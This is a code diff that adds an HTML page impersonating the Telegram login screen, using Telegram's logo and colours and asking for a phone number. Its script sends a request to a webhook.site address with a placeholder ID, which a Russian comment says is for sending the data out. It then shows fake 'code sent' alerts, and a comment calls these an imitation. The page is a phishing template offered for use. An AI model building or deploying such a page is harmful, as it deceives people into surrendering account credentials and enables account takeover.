@@ -1,1 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f1f2f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            width: 300px;
+            text-align: center;
+        }
+        h2 {
+            color: #2481cc;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #2481cc;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #1e6baa;
+        }
+        .logo {
+            width: 50px;
+            height: 50px;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Логотип Telegram -->
+        <svg class="logo" viewBox="0 0 24 24" fill="#2481cc"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.01-.38-1.57-.74-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.73-2.5 2.78-2.7a.96.96 0 0 0-.24-.74c-.09-.08-.22-.05-.32-.02-.14.05-2.38 1.52-6.76 4.42-.64.44-1.22.66-1.84.65-.6-.01-1.76-.34-2.62-.62-1.06-.34-1.91-.53-1.83-1.12.05-.33.5-.66 1.37-.99 5.39-2.35 8.99-3.91 10.8-4.68.52-.25 1-.38 1.43-.38.42 0 .82.26 1.05.66.23.4.26.82.22 1.23z"/></svg>
+        
+        <h2>Telegram</h2>
+        <form id="loginForm">
+            <input type="text" id="phone" placeholder="Phone number" required>
+            <button type="submit">Next</button>
+        </form>
+    </div>
 
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const phone = document.getElementById('phone').value;
+            
+            // Отправка данных на Webhook.site
+            fetch('https://webhook.site/ВАШ_УНИКАЛЬНЫЙ_ID') 
+                .then(response => response.json())
+                .then(data => console.log('Data sent:', data))
+                .catch(error => console.error('Error:', error));
+
+            alert('Code sent to ' + phone);
+            // Имитация отправки кода
+            setTimeout(() => {
+                alert('Enter the code sent to your SMS');
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
